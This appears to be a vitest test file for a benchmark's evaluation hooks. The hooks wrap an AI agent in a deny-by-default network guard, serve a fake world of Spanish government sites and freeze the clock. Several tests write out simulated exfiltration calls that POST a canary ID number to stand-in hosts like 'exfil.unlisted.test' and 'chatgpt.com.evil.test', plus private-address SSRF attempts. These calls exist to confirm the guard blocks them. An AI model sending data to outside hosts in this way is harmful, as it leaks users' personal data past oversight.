import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { Api, Model } from '@earendil-works/pi-ai';
import type { AnyToolDefinition, ResolvedHostConfig } from '@sa/agent/host-runtime';
import { afterEach, beforeEach, describe, expect, it, type MockInstance, vi } from 'vitest';
import type { HostEvalConfig } from '../../src/contracts';
import {
  agentProviderOf,
  buildEvalHooks,
  createEvalHooks,
  type EvalHooks,
} from '../../src/host/hooks';
import { readNetLog } from '../../src/net/netlog-reader';
import { docAddress } from '../../src/net/wire';
import { withCallContext } from '../../src/net/world-fetch';
import { BOE, COLLECTOR, type FakeWorld, SEDE, startFakeWorld, UNMAPPED } from './fake-world';
import { hostConfig } from './support';

let world: FakeWorld;
let gateway: Server;
let gatewayOrigin: string;
let dir: string;
let netlog: string;
let created: EvalHooks[];
let realFetch: typeof globalThis.fetch;
let RealWebSocket: typeof globalThis.WebSocket;
let stderr: MockInstance<typeof process.stderr.write>;

beforeEach(async () => {
  wall = 1_000_000;
  // The guard warns on stderr when it refuses something; the tests read those lines.
  stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  world = await startFakeWorld();
  gateway = createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end('{"model":"ok"}');
  });
  await new Promise<void>((resolve) => gateway.listen(0, '127.0.0.1', resolve));
  gatewayOrigin = `http://127.0.0.1:${(gateway.address() as AddressInfo).port}`;
  dir = mkdtempSync(join(tmpdir(), 'sa-eval-hooks-'));
  netlog = join(dir, 'host.jsonl');
  created = [];
  realFetch = globalThis.fetch;
  RealWebSocket = globalThis.WebSocket;
});

afterEach(async () => {
  for (const hooks of created) hooks.close();
  // The guard must have given the globals back.
  expect(globalThis.fetch).toBe(realFetch);
  expect(globalThis.WebSocket).toBe(RealWebSocket);
  stderr.mockRestore();
  gateway.closeAllConnections();
  await new Promise((resolve) => gateway.close(resolve));
  await world.close();
  rmSync(dir, { recursive: true, force: true });
});

/** The wall clock the hooks measure elapsed time with: still, unless a test moves it. */
let wall = 1_000_000;

function build(over: Partial<HostEvalConfig> = {}, provider = 'litellm'): EvalHooks {
  const hooks = buildEvalHooks(hostConfig(world.origin, netlog, over), {
    provider,
    wallClock: () => wall,
  });
  created.push(hooks);
  return hooks;
}

const model = (baseUrl: string) =>
  ({ provider: 'litellm', id: 'anthropic/claude-haiku-5.5', baseUrl }) as Model<Api>;
const resolved = {} as ResolvedHostConfig;

async function failure(
  promise: Promise<unknown>,
): Promise<TypeError & { cause: { code?: string } }> {
  try {
    await promise;
  } catch (error) {
    return error as TypeError & { cause: { code?: string } };
  }
  throw new Error('expected a failure');
}

describe('egress', () => {
  it('serves real hostnames from the world, with the clock frozen', async () => {
    const { hooks } = build();
    const response = await hooks.egress?.fetch(new URL(`https://${SEDE}/tramite`), {
      redirect: 'manual',
    });
    expect(response?.status).toBe(200);
    expect(response?.url).toBe(`https://${SEDE}/tramite`);
    expect(await response?.text()).toContain('Texto del trámite');
    expect(response?.headers.get('date')).toBe(new Date('2026-03-14T09:30:00+01:00').toUTCString());
    expect(world.requests).toHaveLength(1);
    expect(world.requests[0]).toMatchObject({ host: SEDE, hostHeader: SEDE, path: '/tramite' });
    expect(world.requests[0]?.headers['x-spainbench-world']).toBe('run-host-test');
  });

  it('moves the Date of responses from the frozen instant at real speed, while "now" stays put', async () => {
    const { hooks } = build();
    const dateOf = async () =>
      (
        await hooks.egress?.fetch(new URL(`https://${SEDE}/tramite`), { redirect: 'manual' })
      )?.headers.get('date');
    expect(await dateOf()).toBe('Sat, 14 Mar 2026 08:30:00 GMT');
    wall += 7_000;
    expect(await dateOf()).toBe('Sat, 14 Mar 2026 08:30:07 GMT');
    wall += 3_600_000;
    expect(await dateOf()).toBe('Sat, 14 Mar 2026 09:30:07 GMT');
    expect(hooks.now?.().toISOString()).toBe('2026-03-14T08:30:00.000Z');
  });

  it('writes what the product guard refused to the net log, with the tool call that tried', async () => {
    const { hooks } = build();
    const blocked = hooks.egress?.onBlocked;
    expect(blocked).toBeDefined();
    withCallContext({ tool: 'run_script', toolCallId: 'call-5' }, () =>
      blocked?.({
        url: new URL('http://[::ffff:127.0.0.1]:3020/worlds'),
        method: 'POST',
        message: 'Blocked: ::ffff:7f00:1 is a private address',
      }),
    );
    blocked?.({
      url: new URL('http://localhost/'),
      method: 'GET',
      message: 'Blocked: localhost is a local address',
    });
    const [first, second] = await readNetLog(netlog);
    expect(first).toMatchObject({
      channel: 'run_script',
      toolCallId: 'call-5',
      method: 'POST',
      url: 'http://[::ffff:7f00:1]:3020/worlds',
      host: '::ffff:7f00:1',
      route: 'denied',
      error: 'Blocked: ::ffff:7f00:1 is a private address',
    });
    expect(second).toMatchObject({ channel: 'other', host: 'localhost', route: 'denied' });
    expect(second?.toolCallId).toBeUndefined();
    // Reported on stderr like every refusal, without the path.
    const written = stderr.mock.calls.map((call) => String(call[0])).join('');
    expect(written).toContain('denied: POST http://[::ffff:7f00:1]:3020 (see the net log)');
    expect(written).not.toContain('/worlds');
  });

  it('answers a documentation address for every name, so the SSRF guard works offline', async () => {
    const { hooks } = build();
    const resolve = hooks.egress?.resolveHost;
    for (const host of [SEDE, UNMAPPED, 'www.boe.es', 'colector.exfil-demo.test']) {
      const [answer, ...more] = (await resolve?.(host)) ?? [];
      expect(more).toEqual([]);
      expect(answer?.address).toBe(docAddress(host));
      expect(answer?.address).toMatch(/^(192\.0\.2|198\.51\.100|203\.0\.113)\.\d+$/);
    }
  });

  it('fails an unmapped host the way the config says, and logs it', async () => {
    const { hooks } = build();
    const error = await failure(hooks.egress?.fetch(`https://${UNMAPPED}/x`) as Promise<Response>);
    expect(error.message).toBe('fetch failed');
    expect(error.cause.code).toBe('ENOTFOUND');
    expect(world.requests).toEqual([]);
    const [record] = await readNetLog(netlog);
    expect(record).toMatchObject({ route: 'unmapped', host: UNMAPPED, worldId: 'run-host-test' });

    const dead = build({ unmapped: { mode: 'status', status: 404 }, netlog: join(dir, 'b.jsonl') });
    expect((await dead.hooks.egress?.fetch(`https://${UNMAPPED}/x`))?.status).toBe(404);
    expect(world.requests).toEqual([]);
  });
});

describe('wrapTool', () => {
  const tool = (name: string, run: (id: string) => Promise<unknown>): AnyToolDefinition =>
    ({
      name,
      label: name,
      description: `the ${name} tool`,
      parameters: { type: 'object', properties: {} },
      executionMode: 'parallel',
      execute: async (id: string) => ({ content: [{ type: 'text', text: String(await run(id)) }] }),
    }) as unknown as AnyToolDefinition;

  it('keeps the tool as it is and runs it in its own call context', async () => {
    const { hooks } = build();
    const fetchAs = (path: string) => async () => {
      const response = await hooks.egress?.fetch(new URL(`https://${SEDE}${path}`), {
        redirect: 'manual',
      });
      return response?.status;
    };
    const first = hooks.wrapTool?.(
      tool('fetch_url', async () => fetchAs('/tramite')()),
    ) as AnyToolDefinition;
    const second = hooks.wrapTool?.(
      tool('run_script', async () => fetchAs('/api/estado')()),
    ) as AnyToolDefinition;
    expect(first).toMatchObject({
      name: 'fetch_url',
      description: 'the fetch_url tool',
      executionMode: 'parallel',
    });
    // Two calls in flight at once, each with its own id.
    const results = await Promise.all([
      first.execute('call_a', {}, undefined, undefined, {} as never),
      second.execute('call_b', {}, undefined, undefined, {} as never),
      first.execute('call_c', {}, undefined, undefined, {} as never),
    ]);
    expect(results.map((r) => (r.content[0] as { text: string }).text)).toEqual([
      '200',
      '200',
      '200',
    ]);
    const records = await readNetLog(netlog);
    const byCall = Object.fromEntries(records.map((r) => [r.toolCallId, [r.channel, r.url]]));
    expect(byCall).toEqual({
      call_a: ['fetch_url', `https://${SEDE}/tramite`],
      call_b: ['run_script', `https://${SEDE}/api/estado`],
      call_c: ['fetch_url', `https://${SEDE}/tramite`],
    });
    expect(world.requests.map((r) => [r.path, r.headers['x-spainbench-source']]).sort()).toEqual([
      ['/api/estado', 'run_script'],
      ['/tramite', 'fetch_url'],
      ['/tramite', 'fetch_url'],
    ]);
  });

  it('passes the tool’s own failure through', async () => {
    const { hooks } = build();
    const broken = hooks.wrapTool?.(
      tool('fetch_url', async () => {
        throw new Error('boom');
      }),
    ) as AnyToolDefinition;
    await expect(broken.execute('call_x', {}, undefined, undefined, {} as never)).rejects.toThrow(
      'boom',
    );
  });
});

describe('now', () => {
  it('is the frozen clock, as a fresh Date every time', () => {
    const { hooks } = build({ now: '2026-10-17T07:30:00Z' });
    const first = hooks.now?.() as Date;
    const second = hooks.now?.() as Date;
    expect(first.toISOString()).toBe('2026-10-17T07:30:00.000Z');
    expect(second).toEqual(first);
    expect(second).not.toBe(first);
  });
});

describe('the deny-by-default guard (onModel)', () => {
  it('lets the model gateway through and nothing else, not even the world’s own hosts', async () => {
    const spy = vi.fn(realFetch);
    globalThis.fetch = spy as typeof fetch;
    const guarded = build();
    const { hooks } = guarded;
    hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved);

    // The LLM traffic: allowed, logged as metadata.
    const ok = await fetch(`${gatewayOrigin}/v1/chat/completions`, { method: 'POST', body: '{}' });
    expect(await ok.json()).toEqual({ model: 'ok' });
    expect(spy).toHaveBeenCalledTimes(1);

    // Anything else cannot leave: an unlisted host, the mock itself, a mapped real host, BOE.
    const attempts = [
      'https://exfil.unlisted.test/c?d=53918274H',
      `${world.origin}/tramite`,
      `https://${SEDE}/tramite`,
      `https://${BOE}/datosabiertos/api/legislacion-consolidada?query=x`,
      `https://${COLLECTOR}/c`,
    ];
    for (const url of attempts) {
      const error = await failure(fetch(url, { method: 'POST', body: 'canary=53918274H' }));
      expect(error.cause.code).toBe('ENOTFOUND');
    }
    expect(spy).toHaveBeenCalledTimes(1);
    expect(world.requests).toEqual([]);

    const records = await readNetLog(netlog);
    expect(records.map((r) => [r.route, r.channel])).toEqual([
      ['llm', 'llm'],
      ...attempts.map(() => ['denied', 'other']),
    ]);
    expect(records[0]).toMatchObject({ url: `${gatewayOrigin}/v1/chat/completions`, status: 200 });
    expect(records[0]?.reqBody).toBeUndefined();
    expect(records[1]).toMatchObject({
      method: 'POST',
      url: 'https://exfil.unlisted.test/c?d=53918274H',
      reqBody: 'canary=53918274H',
    });
    // Closing puts back what was there before the guard: here the spy.
    guarded.close();
    expect(globalThis.fetch).toBe(spy);
    globalThis.fetch = realFetch;
  });

  it('refuses WebSockets to anything but the gateway', async () => {
    const { hooks } = build();
    hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved);
    const socket = new WebSocket('wss://chatgpt.com/backend-api/codex/responses');
    const closed = await new Promise<number>((resolve) => {
      socket.addEventListener('close', (event) => resolve((event as CloseEvent).code));
    });
    expect(closed).toBe(1006);
    const [record] = await readNetLog(netlog);
    expect(record).toMatchObject({ route: 'denied', host: 'chatgpt.com' });
  });

  it('allows the extra origins of the config (Codex through its own endpoint)', async () => {
    const extra = createServer((_req, res) => res.end('extra'));
    await new Promise<void>((resolve) => extra.listen(0, '127.0.0.1', resolve));
    try {
      const origin = `http://127.0.0.1:${(extra.address() as AddressInfo).port}`;
      const { hooks } = build({ llm: { extraAllowOrigins: [origin] } });
      hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved);
      expect(await (await fetch(`${origin}/x`)).text()).toBe('extra');
      expect((await readNetLog(netlog)).map((r) => r.route)).toEqual(['llm']);
    } finally {
      extra.closeAllConnections();
      await new Promise((resolve) => extra.close(resolve));
    }
  });

  it('opens a Codex run to chatgpt.com (https and wss) and to nothing else, with no real connection made', async () => {
    // Stand-ins for the platform's own fetch and WebSocket: nothing here may connect anywhere.
    const reached: string[] = [];
    const fetchSpy = (async (input: string | URL | Request) => {
      reached.push(`fetch ${String(input)}`);
      return new Response('ok');
    }) as typeof fetch;
    class SocketSpy {
      static readonly CONNECTING = 0;
      static readonly OPEN = 1;
      static readonly CLOSING = 2;
      static readonly CLOSED = 3;
      constructor(url: string | URL) {
        reached.push(`socket ${String(url)}`);
      }
    }
    globalThis.fetch = fetchSpy;
    globalThis.WebSocket = SocketSpy as unknown as typeof WebSocket;
    const guarded = build({}, 'openai-codex');
    guarded.hooks.onModel?.(
      {
        ...model('https://chatgpt.com/backend-api'),
        provider: 'openai-codex',
        id: 'gpt-6.1-sol',
      } as Model<Api>,
      resolved,
    );
    try {
      await fetch('https://chatgpt.com/backend-api/codex/responses', { method: 'POST' });
      new WebSocket('wss://chatgpt.com/backend-api/codex/responses');
      expect(reached).toEqual([
        'fetch https://chatgpt.com/backend-api/codex/responses',
        'socket wss://chatgpt.com/backend-api/codex/responses',
      ]);
      await failure(fetch('https://api.openai.com/v1/responses', { method: 'POST' }));
      await failure(fetch('https://auth.openai.com/oauth/token', { method: 'POST' }));
      new WebSocket('wss://api.openai.com/v1/realtime');
      new WebSocket('ws://chatgpt.com.evil.test/backend-api/codex/responses');
      expect(reached).toHaveLength(2);
      const log = await readNetLog(netlog);
      expect(log.map((r) => `${r.route} ${r.host}`)).toEqual([
        'llm chatgpt.com',
        'llm chatgpt.com',
        'denied api.openai.com',
        'denied auth.openai.com',
        'denied api.openai.com',
        'denied chatgpt.com.evil.test',
      ]);
    } finally {
      guarded.close();
      globalThis.fetch = realFetch;
      globalThis.WebSocket = RealWebSocket;
    }
  });

  it('attributes a denied request to the tool call that made it, and says so on stderr without its data', async () => {
    const { hooks } = build();
    hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved);
    // A tool that forgot to use `egress.fetch`: BOE through the global fetch.
    const leaky = hooks.wrapTool?.({
      name: 'boe_search',
      execute: async () => {
        await fetch(`https://${BOE}/datosabiertos/api/legislacion-consolidada?query=DNI-53918274H`);
        return { content: [] };
      },
    } as unknown as AnyToolDefinition) as AnyToolDefinition;
    await expect(leaky.execute('call_boe', {}, undefined, undefined, {} as never)).rejects.toThrow(
      'fetch failed',
    );
    const [record] = await readNetLog(netlog);
    expect(record).toMatchObject({
      route: 'denied',
      channel: 'boe_search',
      toolCallId: 'call_boe',
    });
    const written = stderr.mock.calls.map((call) => String(call[0])).join('');
    expect(written).toContain(`[sa-host] warn denied: GET https://${BOE} (see the net log)`);
    expect(written).not.toContain('53918274H');
  });

  it('fails closed: no gateway origin, no guard, and a second install is an error', () => {
    const { hooks } = build();
    expect(() => hooks.onModel?.(model(''), resolved)).toThrow(/no usable base URL/);
    expect(globalThis.fetch).toBe(realFetch);
    hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved);
    expect(() => hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved)).toThrow(
      /already installed/,
    );
  });

  it('puts the globals back when closed', () => {
    const hooks = build();
    hooks.hooks.onModel?.(model(`${gatewayOrigin}/v1`), resolved);
    expect(globalThis.fetch).not.toBe(realFetch);
    hooks.close();
    expect(globalThis.fetch).toBe(realFetch);
    expect(globalThis.WebSocket).toBe(RealWebSocket);
  });
});

describe('createEvalHooks', () => {
  const configFile = () => {
    const file = join(dir, 'host-config.json');
    writeFileSync(file, JSON.stringify(hostConfig(world.origin, netlog)));
    return file;
  };
  const agentConfig = (provider: string) =>
    JSON.stringify({ role: 'procedure', procedureId: 'p1', model: { provider, id: 'm' } });

  it('reads the config file and the provider of the agent it launches', () => {
    const file = configFile();
    const litellm = createEvalHooks({
      SA_EVAL_CONFIG: file,
      SA_AGENT_CONFIG: agentConfig('litellm'),
    });
    expect(litellm.research?.backend).toBe('key server');
    const codex = createEvalHooks({
      SA_EVAL_CONFIG: file,
      SA_AGENT_CONFIG: agentConfig('openai-codex'),
    });
    expect(codex.research?.backend).toBe('chatgpt');
    for (const hooks of [litellm, codex]) {
      expect(Object.keys(hooks).sort()).toEqual([
        'egress',
        'now',
        'onModel',
        'research',
        'wrapTool',
      ]);
    }
  });

  it('refuses to start without them', () => {
    const file = configFile();
    expect(() => createEvalHooks({ SA_AGENT_CONFIG: agentConfig('litellm') })).toThrow(
      /SA_EVAL_CONFIG is not set/,
    );
    expect(() => createEvalHooks({ SA_EVAL_CONFIG: file })).toThrow(/SA_AGENT_CONFIG is not set/);
    expect(() => createEvalHooks({ SA_EVAL_CONFIG: file, SA_AGENT_CONFIG: '{' })).toThrow(
      /not JSON/,
    );
    expect(() =>
      createEvalHooks({ SA_EVAL_CONFIG: file, SA_AGENT_CONFIG: '{"model":{}}' }),
    ).toThrow(/no model.provider/);
    expect(agentProviderOf({ SA_AGENT_CONFIG: agentConfig('custom') })).toBe('custom');
  });
});
